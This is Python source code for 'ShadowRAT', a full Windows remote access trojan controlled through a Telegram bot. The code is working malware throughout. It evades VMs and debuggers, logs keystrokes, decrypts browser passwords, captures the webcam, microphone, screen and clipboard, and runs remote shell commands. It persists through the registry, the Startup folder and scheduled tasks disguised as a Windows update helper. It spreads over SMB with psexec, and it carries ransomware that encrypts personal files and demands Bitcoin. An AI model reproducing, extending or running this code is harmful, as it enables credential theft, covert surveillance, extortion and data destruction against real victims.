# ShadowRAT - Ultimate Windows Edition 2026
# Python 3.10+ | Required: pip install pyTelegramBotAPI pynput pillow opencv-python pyautogui psutil cryptography sounddevice soundfile pyperclip netifaces
# Removed pywin32 dependency; replaced with ctypes for DPAPI decryption (browser passwords)

import telebot
import os
import platform
import socket
import uuid
import subprocess
import threading
import time
import pyautogui
import cv2
import pynput.keyboard as kb
from PIL import ImageGrab
import sqlite3
import shutil
import hashlib
import getpass
import sys
import json
import base64
import pyperclip
import sounddevice as sd
import soundfile as sf
import psutil
from datetime import datetime
import ctypes
from ctypes import windll, c_size_t, c_char_p, Structure, POINTER, byref, cast
from cryptography.fernet import Fernet
import netifaces

# ===================== CONFIG =====================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"          # ← غيرها
ALLOWED_CHAT_ID = 123456789                # ← غيرها

# ===================== HWID =====================
def generate_hwid():
    try:
        mac = uuid.getnode()
        cpu = platform.processor()
        disk = os.getenv('SystemDrive')
        user = getpass.getuser()
        combined = f"{mac}{cpu}{disk}{user}"
        return hashlib.sha256(combined.encode()).hexdigest()[:16].upper()
    except:
        return "HWID_ERROR"

VICTIM_HWID = generate_hwid()

# ===================== ANTI-VM / ANTI-DEBUG =====================
def is_vm_or_sandbox():
    suspicious = ["vboxservice.exe", "vmtoolsd.exe", "wireshark.exe", "fiddler.exe", "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "idaq.exe"]
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in suspicious:
            return True
    if psutil.virtual_memory().total < 2 * 1024**3 or psutil.cpu_count() < 2:
        return True
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

if is_vm_or_sandbox():
    sys.exit(0)

# ===================== BOT =====================
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== KEYLOGGER ADVANCED =====================
log_file = os.path.join(os.getenv("TEMP"), "shadow_keys.log")
current_log = ""

def on_press(key):
    global current_log
    try:
        current_log += key.char if hasattr(key, 'char') and key.char else f"[{key}]"
    except:
        pass
    if len(current_log) > 100:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {current_log}\n")
        current_log = ""

listener = kb.Listener(on_press=on_press)
listener.start()

def auto_send_keylogs():
    while True:
        time.sleep(600)  # كل 10 دقايق
        try:
            if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
                with open(log_file, "r", encoding="utf-8") as f:
                    logs = f.read()
                send_to_c2(text=f"Keylogs (last 10 min):\n{logs}")
                open(log_file, "w").close()
        except:
            pass

threading.Thread(target=auto_send_keylogs, daemon=True).start()

# ===================== SEND FUNCTION =====================
def send_to_c2(text=None, photo=None, document=None, caption=None):
    victim_tag = f"Victim: {VICTIM_HWID}"
    try:
        if text:
            bot.send_message(ALLOWED_CHAT_ID, f"{victim_tag}\n{text}")
        elif photo:
            bot.send_photo(ALLOWED_CHAT_ID, photo, caption=f"{victim_tag}\n{caption or ''}")
        elif document:
            bot.send_document(ALLOWED_CHAT_ID, document, caption=f"{victim_tag}\n{caption or ''}")
    except:
        pass

# ===================== INITIAL INFO =====================
def send_initial_info():
    info = f"""
NEW VICTIM CONNECTED!
HWID: {VICTIM_HWID}
OS: {platform.system()} {platform.release()}
User: {getpass.getuser()}
IP: {socket.gethostbyname(socket.gethostname())}
Processor: {platform.processor()}
RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB
    """
    send_to_c2(text=info)

    try:
        screenshot = ImageGrab.grab()
        screenshot.save("init.png")
        send_to_c2(photo=open("init.png", "rb"))
        os.remove("init.png")
    except:
        pass

# ===================== PASSWORD STEALER (using ctypes instead of win32crypt) =====================
class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", c_size_t), ("pbData", c_char_p)]

def crypt_unprotect_data(encrypted_bytes):
    blob_in = DATA_BLOB(len(encrypted_bytes), cast(encrypted_bytes, c_char_p))
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, None, None, None, 0, byref(blob_out)):
        decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        windll.kernel32.LocalFree(blob_out.pbData)
        return decrypted
    else:
        return b""

def steal_browser_passwords():
    browsers = {
        "Chrome": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Google\Chrome\User Data\Default\Login Data"),
        "Edge": os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data"),
        "Opera": os.path.join(os.environ["USERPROFILE"], r"AppData\Roaming\Opera Software\Opera Stable\Login Data"),
    }
    all_passwords = []
    for browser, path in browsers.items():
        if not os.path.exists(path):
            continue
        try:
            temp_db = "temp_logins.db"
            shutil.copy2(path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, user, enc_pass = row
                try:
                    decrypted = crypt_unprotect_data(enc_pass).decode('utf-8', errors='ignore')
                    all_passwords.append(f"{browser} | {url} | {user} | {decrypted}")
                except:
                    pass
            conn.close()
            os.remove(temp_db)
        except:
            pass
    if all_passwords:
        send_to_c2(text="\n".join(all_passwords))
    else:
        send_to_c2(text="No passwords found or error")

# ===================== MICROPHONE RECORD =====================
def record_mic(seconds):
    try:
        fs = 44100
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        filename = f"mic_{int(time.time())}.wav"
        sf.write(filename, recording, fs)
        send_to_c2(document=open(filename, "rb"), caption=f"Microphone recording ({seconds}s)")
        os.remove(filename)
    except Exception as e:
        send_to_c2(text=f"Mic error: {str(e)}")

# ===================== FILE MANAGER =====================
def handle_file_manager(cmd_parts):
    action = cmd_parts[0].lower()
    path = " ".join(cmd_parts[1:]) if len(cmd_parts) > 1 else os.getcwd()

    if action in ["/list", "/ls"]:
        try:
            files = "\n".join(os.listdir(path))
            send_to_c2(text=f"Files in {path}:\n{files}")
        except Exception as e:
            send_to_c2(text=f"Error: {str(e)}")

    elif action in ["/delete", "/del"]:
        try:
            if os.path.isfile(path):
                os.remove(path)
            elif os.path.isdir(path):
                shutil.rmtree(path)
            send_to_c2(text=f"Deleted: {path}")
        except Exception as e:
            send_to_c2(text=f"Delete error: {str(e)}")

    elif action == "/rename":
        if len(cmd_parts) < 3:
            send_to_c2(text="Usage: /rename old_path new_name")
            return
        old = path
        new = " ".join(cmd_parts[2:])
        try:
            os.rename(old, new)
            send_to_c2(text=f"Renamed {old} → {new}")
        except Exception as e:
            send_to_c2(text=f"Rename error: {str(e)}")

    elif action == "/mkdir":
        try:
            os.makedirs(path, exist_ok=True)
            send_to_c2(text=f"Directory created: {path}")
        except Exception as e:
            send_to_c2(text=f"Mkdir error: {str(e)}")

    elif action == "/download":
        if os.path.exists(path):
            send_to_c2(document=open(path, "rb"), caption=f"Download: {path}")
        else:
            send_to_c2(text="File not found")

# ===================== PERSISTENCE =====================
def add_persistence():
    exe_path = os.path.abspath(sys.argv[0])
    name = "WindowsUpdateHelper"

    # Startup Folder
    startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup", f"{name}.lnk")
    if not os.path.exists(startup):
        subprocess.call(f'powershell -Command "$s=(New-Object -COM WScript.Shell).CreateShortcut(\'{startup}\');$s.TargetPath=\'{exe_path}\';$s.Save()"', shell=True)

    # Registry Run
    subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {name} /t REG_SZ /d "{exe_path}" /f', shell=True)

    # Task Scheduler
    subprocess.call(f'schtasks /create /tn "{name}" /tr "{exe_path}" /sc onlogon /rl highest /f', shell=True)

add_persistence()

# ===================== RANSOMWARE ULTIMATE =====================
MASTER_KEY = Fernet.generate_key()
RANSOMWARE_ACTIVE = False

TARGET_EXTENSIONS = [".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".png", ".mp3", ".mp4", ".zip", ".rar", ".txt", ".sql", ".wallet", ".bak"]
TARGET_DIRECTORIES = [
    os.path.expanduser("~\\Desktop"), os.path.expanduser("~\\Documents"),
    os.path.expanduser("~\\Pictures"), os.path.expanduser("~\\Downloads"),
    os.path.expanduser("~\\Music"), os.path.expanduser("~\\Videos")
]

def encrypt_file(filepath):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        fernet = Fernet(MASTER_KEY)
        encrypted = fernet.encrypt(data)
        new_path = filepath + ".SHADOW"
        with open(new_path, "wb") as f:
            f.write(encrypted)
        os.remove(filepath)
        return True
    except:
        return False

def create_ransom_note():
    note = f"""
══════════════════════════════════════════════════════════
     YOUR FILES ARE ENCRYPTED BY SHADOW 2026
══════════════════════════════════════════════════════════

All your important files are encrypted with AES-256.

Victim ID: {VICTIM_HWID}
Pay 0.07 BTC to: bc1qshadow2026dem0nxxxxxxxxxxxxxx
Send proof + Victim ID to: @ShadowDecrypt2026

You have 72 hours. After that, price 0.2 BTC and key deleted forever.

Files now end with: .SHADOW

- Shadow Group 2026
    """
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    with open(os.path.join(desktop, "READ_ME.txt"), "w", encoding="utf-8") as f:
        f.write(note)

def full_ransomware_attack():
    global RANSOMWARE_ACTIVE
    if RANSOMWARE_ACTIVE:
        return
    RANSOMWARE_ACTIVE = True
    send_to_c2(text=f"RANSOMWARE ACTIVATED!\nMaster Key (save it): {base64.urlsafe_b64encode(MASTER_KEY).decode()}")
    create_ransom_note()
    encrypted_count = 0
    for dir_path in TARGET_DIRECTORIES:
        if not os.path.exists(dir_path):
            continue
        for root, _, files in os.walk(dir_path):
            for file in files:
                if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                    if encrypt_file(os.path.join(root, file)):
                        encrypted_count += 1
    send_to_c2(text=f"Encrypted {encrypted_count} files! 🔥")

# ===================== AUTO-SPREAD (WANNA-CRY STYLE) =====================
def get_local_ip():
    try:
        return netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
    except:
        return socket.gethostbyname(socket.gethostname())

def scan_network():
    ip = get_local_ip()
    subnet = ".".join(ip.split(".")[:3]) + "."
    targets = []
    for i in range(1, 255):
        target_ip = subnet + str(i)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, 445))
            s.close()
            targets.append(target_ip)
        except:
            pass
    return targets

def spread_to_target(target_ip):
    try:
        exe_name = os.path.basename(sys.argv[0])
        remote_path = f"\\\\{target_ip}\\C$\\Windows\\Temp\\{exe_name}"
        subprocess.call(f'copy "{sys.argv[0]}" "{remote_path}"', shell=True, timeout=10)
        psexec_cmd = f'psexec \\\\{target_ip} -s -d -c "{exe_name}"'
        subprocess.call(psexec_cmd, shell=True, timeout=15)
        send_to_c2(text=f"Spread success: {target_ip}")
    except Exception as e:
        send_to_c2(text=f"Spread failed {target_ip}: {str(e)}")

def auto_spread():
    while True:
        time.sleep(1800)  # كل 30 دقيقة
        try:
            targets = scan_network()
            for target in targets:
                if target != get_local_ip():
                    spread_to_target(target)
        except:
            pass

threading.Thread(target=auto_spread, daemon=True).start()

# ===================== COMMANDS HANDLER =====================
@bot.message_handler(func=lambda m: m.chat.id == ALLOWED_CHAT_ID)
def handle_commands(message):
    text = message.text.strip().lower()
    cmd_parts = text.split()
    if not cmd_parts:
        return
    cmd = cmd_parts[0]

    if cmd == "/start":
        send_to_c2(text="ShadowRAT Online 🖤\nUse /help")

    elif cmd == "/help":
        help_text = """
    /sysinfo       - System Info
    /screenshot    - Take screenshot
    /webcam        - Webcam snap
    /keylog        - Current keylogs
    /passwords     - Steal browser passwords
    /clipboard     - Get clipboard
    /mic <seconds> - Record microphone
    /upload        - Send file to upload
    /download <path> - Download file
    /list <path>   - List directory
    /delete <path> - Delete file/folder
    /rename <old> <new>
    /mkdir <path>
    /exec <cmd>    - Execute shell
    /shutdown      - Shutdown PC
    /restart       - Restart PC
    /ransom_go     - Start Ransomware
    /ransom_status - Check status
            """
        send_to_c2(text=help_text)

    elif cmd in ["/commands", "/helpfull"]:
        full_help = f"""
**ShadowRAT 2026 - All Commands**

**/start** - Check online  
**/sysinfo** - System details  
**/screenshot** - Capture screen  
**/webcam** - Webcam photo  
**/clipboard** - Get clipboard  
**/keylog** - Keylogger logs  
**/passwords** - Steal browser passwords  
**/mic <seconds>** - Record mic (ex: /mic 30)

**File Manager:**
**/list** <path> - List files  
**/download** <path> - Download file  
**/upload** - Upload file (attach after command)  
**/delete** <path> - Delete  
**/rename** <old> <new> - Rename  
**/mkdir** <path> - Create folder

**Control:**
**/exec** <cmd> - Run shell command  
**/shutdown** - Power off  
**/restart** - Reboot

**Ransomware:**
**/ransom_go** - Activate encryption  
**/ransom_status** - Check status & key

**HWID:** `{VICTIM_HWID}`
        """
        send_to_c2(text=full_help)

    elif cmd == "/sysinfo":
        send_to_c2(text=f"HWID: {VICTIM_HWID}\nOS: {platform.system()} {platform.release()}\nUser: {getpass.getuser()}")

    elif cmd == "/screenshot":
        try:
            screenshot = ImageGrab.grab()
            screenshot.save("screen.png")
            send_to_c2(photo=open("screen.png", "rb"))
            os.remove("screen.png")
        except Exception as e:
            send_to_c2(text=f"Screenshot error: {str(e)}")

    elif cmd == "/webcam":
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("webcam.jpg", frame)
                send_to_c2(photo=open("webcam.jpg", "rb"))
                os.remove("webcam.jpg")
            cap.release()
        except Exception as e:
            send_to_c2(text=f"Webcam error: {str(e)}")

    elif cmd == "/keylog":
        if os.path.exists(log_file):
            with open(log_file, "r", encoding="utf-8") as f:
                logs = f.read()
            send_to_c2(text=f"Keylogs:\n{logs}")
        else:
            send_to_c2(text="No keylogs yet")

    elif cmd == "/passwords":
        steal_browser_passwords()

    elif cmd == "/clipboard":
        try:
            clip = pyperclip.paste()
            send_to_c2(text=f"Clipboard:\n{clip}")
        except:
            send_to_c2(text="Clipboard error")

    elif cmd.startswith("/mic "):
        try:
            seconds = int(cmd_parts[1])
            record_mic(seconds)
        except:
            send_to_c2(text="Usage: /mic 30")

    elif cmd.startswith("/upload"):
        if message.document:
            try:
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                save_path = os.path.join(os.getcwd(), message.document.file_name)
                with open(save_path, "wb") as f:
                    f.write(downloaded_file)
                send_to_c2(text=f"File uploaded: {save_path}")
            except Exception as e:
                send_to_c2(text=f"Upload error: {str(e)}")
        else:
            send_to_c2(text="Send the file with /upload")

    elif cmd.startswith("/download"):
        path = " ".join(cmd_parts[1:])
        handle_file_manager(["/download", path])

    elif cmd in ["/list", "/ls", "/delete", "/del", "/rename", "/mkdir"]:
        handle_file_manager(cmd_parts)

    elif cmd.startswith("/exec "):
        command = " ".join(cmd_parts[1:])
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, encoding='utf-8', errors='ignore')
            send_to_c2(text=f"Output:\n{output}")
        except Exception as e:
            send_to_c2(text=f"Exec error: {str(e)}")

    elif cmd == "/shutdown":
        subprocess.call("shutdown /s /t 0", shell=True)

    elif cmd == "/restart":
        subprocess.call("shutdown /r /t 0", shell=True)

    elif cmd == "/ransom_go":
        if not RANSOMWARE_ACTIVE:
            threading.Thread(target=full_ransomware_attack, daemon=True).start()
            send_to_c2(text="Ransomware launched... burning everything 🔥")
        else:
            send_to_c2(text="Already active!")

    elif cmd == "/ransom_status":
        send_to_c2(text=f"Ransomware Active: {RANSOMWARE_ACTIVE}\nMaster Key: {base64.urlsafe_b64encode(MASTER_KEY).decode()}")

# ===================== MAIN =====================
def start_bot():
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            time.sleep(10)

if __name__ == "__main__":
    send_initial_info()
    threading.Thread(target=start_bot, daemon=True).start()
    while True:
        time.sleep(3600)